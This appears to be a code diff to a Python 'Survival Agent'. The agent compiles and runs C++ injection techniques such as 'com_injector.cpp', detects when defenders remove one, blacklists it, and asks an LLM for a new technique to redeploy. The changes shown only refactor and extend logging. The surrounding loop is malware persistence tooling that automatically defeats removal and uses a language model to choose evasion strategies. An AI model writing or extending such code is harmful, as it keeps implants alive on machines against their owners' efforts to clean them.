@@ -12,12 +12,7 @@ from brain_executor import ask_dolphin_for_strategy
 ACTIVE_TECHNIQUE = "com_injector.cpp" # Starting technique
 BLACKLIST = []
 
-def log_event(message):
-    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-    log_path = os.path.join(base_dir, "survival_log.txt")
-    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with open(log_path, "a") as f:
-        f.write(f"[{timestamp}] {message}\n")
+from logger_util import log_event
 
 def compile_and_run(cpp_filename):
     """
@@ -91,6 +86,7 @@ def main_loop():
     print(f"[*] Survival Agent Active. Current Technique: {ACTIVE_TECHNIQUE}")
     
     # Initial Deployment
+    log_event(f"[*] Survival Agent Active. Current Technique: {ACTIVE_TECHNIQUE}")
     compile_and_run(ACTIVE_TECHNIQUE)
     
     while True:
@@ -98,7 +94,7 @@ def main_loop():
         
         if not is_healthy:
             print(f"[!] FAILURE DETECTED: {ACTIVE_TECHNIQUE} has been removed.")
-            log_event(f"CRITICAL: {ACTIVE_TECHNIQUE} failed.")
+            log_event(f"[!] FAILURE DETECTED: {ACTIVE_TECHNIQUE} has been removed.", include_state=True)
             
             # 1. Add failed technique to Blacklist (Requirement D)
             BLACKLIST.append(ACTIVE_TECHNIQUE)
@@ -118,12 +114,14 @@ def main_loop():
                 success = compile_and_run(new_technique)
                 if success:
                     ACTIVE_TECHNIQUE = new_technique
-                    log_event(f"RECOVERY SUCCESS: Transitioned to {ACTIVE_TECHNIQUE}")
+                    log_event(f"[+] RECOVERY SUCCESS: Transitioned to {ACTIVE_TECHNIQUE}")
             else:
                 print("[-] LLM failed to provide a valid strategy. Retrying in next cycle...")
         
         else:
-            print(f"[+] {datetime.datetime.now().strftime('%H:%M:%S')} - {ACTIVE_TECHNIQUE} Health: OK")
+            msg = f"[+] {datetime.datetime.now().strftime('%H:%M:%S')} - {ACTIVE_TECHNIQUE} Health: OK"
+            print(msg)
+            log_event(msg)
         
         time.sleep(30)
 
